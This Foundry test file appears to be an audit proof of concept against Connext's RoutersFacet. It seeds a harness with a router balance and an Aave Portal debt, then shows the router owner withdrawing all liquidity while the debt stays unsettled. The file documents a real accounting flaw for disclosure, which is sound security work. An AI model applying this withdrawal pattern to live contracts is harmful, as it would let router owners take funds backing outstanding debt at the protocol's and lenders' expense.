// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

import "forge-std/Test.sol";
import "../src/connext/core/connext/facets/RoutersFacet.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockConnextToken is ERC20 {
    constructor() ERC20("Mock local asset", "MLA") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @dev Uses the production facet and its actual AppStorage layout.  The
/// setter is test-only; the withdrawal itself is RoutersFacet code verbatim.
contract RoutersHarness is RoutersFacet {
    function seedRouter(
        address router_,
        address owner_,
        address asset_,
        uint256 balance_,
        bytes32 transferId_,
        uint256 debt_
    ) external {
        s.routerPermissionInfo.routerOwners[router_] = owner_;
        s.routerBalances[router_][asset_] = balance_;
        s.portalDebt[transferId_] = debt_;
        s._status = 1;
    }

    function routerBalance(address router_, address asset_) external view returns (uint256) {
        return s.routerBalances[router_][asset_];
    }

    function portalDebt(bytes32 transferId_) external view returns (uint256) {
        return s.portalDebt[transferId_];
    }
}

contract PoC_25134 is Test {
    RoutersHarness internal connext;
    MockConnextToken internal asset;
    address internal constant ROUTER = address(0xBEEF);
    address internal constant ROUTER_OWNER = address(0xCAFE);
    address internal constant RECIPIENT = address(0xD00D);
    bytes32 internal constant TRANSFER_ID = keccak256("portal-loan");

    function setUp() public {
        connext = new RoutersHarness();
        asset = new MockConnextToken();
        asset.mint(address(connext), 100 ether);
        connext.seedRouter(ROUTER, ROUTER_OWNER, address(asset), 100 ether, TRANSFER_ID, 60 ether);
    }

    function test_router_can_withdraw_liquidity_while_portal_debt_remains() public {
        vm.prank(ROUTER_OWNER);
        connext.removeRouterLiquidityFor(100 ether, address(asset), payable(RECIPIENT), ROUTER);

        // This is the missing invariant in the audited RoutersFacet: the
        // router's balance can be withdrawn in full without touching or
        // settling the corresponding Aave Portal debt.
        assertEq(asset.balanceOf(RECIPIENT), 100 ether);
        assertEq(connext.routerBalance(ROUTER, address(asset)), 0);
        assertEq(connext.portalDebt(TRANSFER_ID), 60 ether);
    }
}
